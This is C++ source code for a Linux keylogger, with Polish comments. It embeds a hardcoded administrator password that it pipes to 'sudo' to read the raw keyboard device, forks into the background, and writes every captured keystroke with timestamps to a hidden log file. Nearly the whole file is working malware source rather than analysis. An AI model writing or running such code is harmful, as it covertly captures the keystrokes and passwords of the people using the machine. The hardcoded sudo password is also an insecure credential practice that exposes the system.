#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <unistd.h>
#include <linux/input.h>
#include <string.h>
#include <sys/wait.h>
#include <mutex>
#include <thread>
#include <chrono>

#define	event_path "/dev/input/event0" //event klawiatury (najpewniej 0, ale czasem też jest 3 lub inny, trzeba sprawdzić"
#define pass_word  "tezcatlipoca"      //hasło administratora systemu
#define data_file  "/home/quetz/.data" //ścieżka do pliku logów
#define keys_file  "/home/quetz/.keys" //ścieżka do pliku z klawiszami (musi być ten co w repo)

char keys[242][20];
FILE *data;
std::mutex mutex;

void printTime()
{
	time_t now;
	char *t = (char *)malloc(100);
	time(&now);
	strcpy(t, (char *)ctime(&now));
	t[strlen(t) - 1] = '\0';

    mutex.lock();
	fprintf(data, "\n%s : ", t);
	fflush(data);
	mutex.unlock();

	free(t);
}

void signal_heandle()
{
	printTime();
	fprintf(data, "              << end of Keylogger session >>              \n");
	fclose(data);
	exit(0);
}

void readKeyFile()
{
	FILE *kf = fopen(keys_file, "r");
	if(kf == NULL)
	{
		printTime();
		fprintf(data, "ERROR : keys file missing\n");
		exit(0);
	}
	char line[40];
	int i;
	for(i = 0; fgets(line, 30, kf) > 0 && i < 242; i++)
	{
		line[strlen(line) - 1] = '\0';
		strcpy(keys[i], line);
	}
	fclose(kf);
}

void stamper()
{
	while(1)
	{
		printTime();
		std::this_thread::sleep_for(std::chrono::seconds(30));
	}
}

void init()
{
	int pfds[2];
	int pfds2[2];

	data = fopen(data_file, "a+");

    if(pipe(pfds) == -1)
    {
		printTime();
		fprintf(data, "ERROR : pipe error\n");
		exit(0);
	}
	if(pipe(pfds2) == -1)
	{
		printTime();
		fprintf(data, "ERROR : pipe error\n");
		exit(0);
	}
	if (!fork())
	{
		if (!fork())
		{
			close(1);
			dup(pfds2[1]);
			close(pfds2[0]);
			execlp("echo", "echo", pass_word, NULL);
		}
		else
		{
			wait(NULL);
			close(0);
			dup(pfds2[0]);
			close(1);
			dup(pfds[1]);

			close(pfds[0]);
			close(pfds2[1]);
			execlp("sudo", "sudo", "-S", "cat", event_path, NULL);
		}

    }
    else
    {
		//pthread_t pth;
		struct input_event *in;
		char *buff;


		printTime();
		fprintf(data, "              << start of Keylogger session >>              \n");
		fflush(data);
		readKeyFile();

		std::thread stamperThread(stamper);

        while (1)
        {
			buff = (char *)malloc(sizeof(struct input_event) * 64);

			read (pfds[0], buff, sizeof(struct input_event) * 64);
			read (pfds[0], buff, sizeof(struct input_event) * 64);

			in = (struct input_event *)buff;

			if(in -> value < 241)
			{

				mutex.lock();
                fprintf(data, "%s ", keys[in->value]);
                fflush(data);
				mutex.unlock();

			}
			free(buff);
        }
    }
	fflush(data);
}

int main(void)
{

	if(!fork())
		init();
	else
		printf("\nBeware! KeyLogger started!\n");

    return 0;
}
